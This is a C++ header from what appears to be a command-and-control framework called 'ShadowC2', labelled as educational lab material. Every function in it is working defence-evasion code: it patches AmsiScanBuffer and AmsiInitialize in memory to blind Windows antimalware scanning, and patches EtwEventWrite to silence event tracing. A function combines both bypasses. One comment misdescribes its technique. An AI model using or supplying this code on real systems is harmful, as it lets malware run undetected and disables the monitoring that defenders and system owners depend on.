/**
 * ShadowC2 - AMSI & ETW Bypass Module
 * Laboratorio de Ciberseguridad - Uso Educativo
 */

#pragma once
#include <windows.h>
#include <string>

namespace Bypass {

// ============ AMSI BYPASS ============
bool PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return false;
    
    FARPROC pAmsiScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScan) return false;
    
    // Patch: mov eax, 0x80070057 (E_INVALIDARG) ; ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    
    DWORD oldProtect;
    VirtualProtect(pAmsiScan, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAmsiScan, patch, sizeof(patch));
    VirtualProtect(pAmsiScan, sizeof(patch), oldProtect, &oldProtect);
    
    return true;
}

// Patch AMSI using memory allocation technique
bool PatchAMSIEvasion() {
    // Alternative: Hook AMSI by modifying function prologue
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return false;
    
    FARPROC pAmsiInit = GetProcAddress(hAmsi, "AmsiInitialize");
    if (!pAmsiInit) return false;
    
    // Return S_OK immediately
    BYTE patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax ; ret
    
    DWORD oldProtect;
    VirtualProtect(pAmsiInit, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAmsiInit, patch, sizeof(patch));
    VirtualProtect(pAmsiInit, sizeof(patch), oldProtect, &oldProtect);
    
    return true;
}

// ============ ETW BYPASS ============
bool PatchETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;
    
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return false;
    
    // Patch: ret 14h
    #ifdef _WIN64
    BYTE patch[] = { 0xC3 };
    #else
    BYTE patch[] = { 0xC2, 0x14, 0x00 };
    #endif
    
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
    
    return true;
}

// ============ BYPASS BOTH ============
bool BypassAll() {
    return PatchAMSI() && PatchETW();
}

} // namespace Bypass
